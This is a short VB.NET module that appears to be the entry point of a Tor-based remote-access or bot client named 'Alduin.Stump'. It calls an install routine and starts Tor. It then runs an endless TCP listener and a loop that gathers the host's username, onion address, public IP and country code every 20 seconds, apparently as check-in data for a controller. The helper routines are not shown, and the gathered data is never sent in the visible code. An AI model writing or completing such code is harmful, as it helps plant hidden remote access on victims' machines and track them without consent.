Imports System.Threading
Imports Alduin.Stump.Alduin.Stump.Class.Network

Module Main
    Dim NewListener As New Thread(AddressOf Listener)
    Dim NewNotice As New Thread(AddressOf Noticer)
    Sub Main()
        Install()
        StartTor()

        NewListener.Start()
        NewNotice.Start()
    End Sub
    Sub Listener()
        Console.WriteLine("Listening") 'Debugging
        Dim tcplistener As New TcpListen
        While (True)
            tcplistener.TcpAsync()
        End While
    End Sub
    Sub Noticer()
        While (True)
            Dim model As New DefaultRegistrationModel
            model.Username = GetUsername()
            model.Address = GetOnionAddress()
            model.LastIPAddress = GetMyIPAddress()
            model.CountryCode = GetCountyCode(GetMyIPAddress())
            Thread.Sleep(20000)
        End While
    End Sub
End Module
